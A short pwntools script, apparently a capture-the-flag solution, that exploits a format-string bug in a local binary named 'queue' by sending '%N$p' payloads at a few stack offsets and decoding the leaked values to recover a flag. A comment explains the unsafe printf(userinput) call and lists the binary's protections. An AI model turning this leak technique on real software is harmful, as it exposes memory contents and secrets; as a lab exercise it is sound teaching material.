#!/usr/bin/env python3

from pwn import *

# This will automatically get context arch, bits, os etc
exe = './queue'
elf = context.binary = ELF(exe, checksec=False)

# Let's fuzz 100 values
for i in range(14,17):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'? ', '%{}$p'.format(i).encode())
        # Receive the response
        result = p.recvuntil(b'!').decode().split(',')[1].split('\n')[0].split('x')[1]
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + unhex(result).decode())
        # Exit the process
        p.close()
    except EOFError:
        pass

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

    The code looks like this
  fgets(fileData,0x80,file_ptr);
  printf("What did you learn in class today? ");
  fgets(userinput,0x30,stdin);
   printf("Oh nice, ");
  printf(userinput);
  
  Printing the user input without format specfier so we have format string vuln.
  Since the data of file is being read in a variable, an variables are on stack that means we can leak the flag using format string vulnerability

'''
